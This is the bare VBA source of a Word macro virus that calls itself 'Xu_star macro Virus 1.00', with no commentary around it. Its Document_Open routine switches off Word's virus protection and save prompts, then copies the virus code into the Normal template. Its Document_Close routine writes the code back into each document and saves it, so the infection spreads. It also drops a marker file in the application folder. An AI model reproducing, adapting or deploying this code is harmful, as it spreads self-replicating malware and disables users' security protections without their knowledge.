   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   'Xu_star macro Virus  1.00
   Private Sub Document_Close()
   On Error Resume Next
   Dim ADL As Long, NTL As Long
   Dim FileNM As String
   FileNM = System.Application.Path & "\" & Right(Year(Date), 2) & Month(Date) & Day(Date) & Second(Time) & ".dos"
   Dim FNo As Long
   ADL = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   NTL = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

   If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) = "'Xu_star macro Virus  1.00" Then
   FNo = FreeFile
   Open FileNM For Output As #FNo
   Print #FNo, "Xu_star 1.00a Welcome!"
   Close #FNo
   Exit Sub
   End If

   If ADL > 0 Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, LinesCount

   NTL = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   If ActiveDocument.Saved = True Then
      ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines NTL, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, NTL)
      Call ActiveDocument.Save
      ActiveDocument.Saved = True
   End If
   End Sub


   Private Sub Document_Open()
   On Error Resume Next
   Dim ADL As Long, NTL As Long

   Options.VirusProtection = (100 * 0)
   Options.ConfirmConversions = (100 * 0)
   Options.SaveNormalPrompt = (100 * 0)

   ADL = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   NTL = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

   'if Normal not Xu_star virus
   'Infect to normalTemplate
   If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "'Xu_star macro Virus  1.00" Then
      If NTL > 0 Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, LinesCount
      ADL = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
      NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines ADL, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ADL)
   End If
   End Sub
